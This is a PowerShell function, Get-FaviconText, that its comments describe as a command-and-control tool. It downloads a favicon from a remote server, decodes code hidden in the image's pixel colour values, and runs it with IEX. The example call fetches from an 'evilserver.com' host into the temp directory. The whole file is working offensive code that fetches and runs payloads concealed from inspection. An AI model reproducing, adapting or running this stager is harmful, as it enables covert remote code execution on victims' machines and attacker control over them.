function Get-FaviconText
{
    <#
    .SYNOPSIS
    Translate a favicon into executable code for c2 purposes
    C2 Get-FaviconText
    Author: Michael Scott (@_et0x)
     
    .DESCRIPTION
    After creating a favicon using the python sister code in this repository, you serve it up as a 
    vector for c2, to be read by this powershell script in a windows environment.  All the code in 
    the icon is pushed into an IEX() statement for execution.
     
    .PARAMETER URL
    The URL pointing to the favicon you wish to download.
    .PARAMETER WriteTo
    The location on your disk you wish to put the favicon after downloading.  This is a requirement
    for loading the favicon / reading the pixels / translating the colors into code.
    todo:  Add parameters for default locations favicons are saved on a per-browser basis.1

    .EXAMPLE
    C:\PS> Get-FaviconText -URL http://evilserver.com/favicon.ico -WriteTo $env:TEMP
    Description
    -----------
    Download a favicon from evilserver.com, write it to your temp directory, and execute the code within.
    
    .NOTES
    Favicons must be encoded using the python sister code in the parent C2 repository.
   
    .LINK
    http://www.rwnin.net
    #>

    Param(
        
        [string]$URL,
        [string]$WriteTo
        
        )
        
    $data = (new-object net.webclient).downloaddata($URL)
    
    [system.io.file]::writeallbytes("$WriteTo\favicon.ico",$data)
    
    $dll = [string]::format("$env:SystemRoot\Microsoft.NET\Framework\v{0}.{1}.{2}\System.Drawing.dll",$psversiontable.clrversion.major,$psversiontable.clrversion.minor,$psversiontable.clrversion.build)
    
    add-type -path $dll
    
    $img = [system.drawing.image]::fromfile("$($WriteTo)\favicon.ico")
    
    $final = ""
    
    $locIndex = 0

    while (1) {
        
        try{
            
            if (($img.getpixel($locIndex%32,[math]::floor($locIndex/32)).r) -ne 0) {
                $final += [convert]::tochar($img.getpixel($locIndex%32,[math]::floor($locIndex/32)).r)
            } else { break }

            if (($img.getpixel($locIndex%32,[math]::floor($locIndex/32)).g) -ne 0) {
                $final += [convert]::tochar($img.getpixel($locIndex%32,[math]::floor($locIndex/32)).g)
            } else { break }

            if (($img.getpixel($locIndex%32,[math]::floor($locIndex/32)).b) -ne 0) {
                $final += [convert]::tochar($img.getpixel($locIndex%32,[math]::floor($locIndex/32)).b)
            } else { break }

                $locIndex += 1
                
        }catch{break}
        
    }
    
    $img.dispose()
    
    IEX($final -join '')
    
}
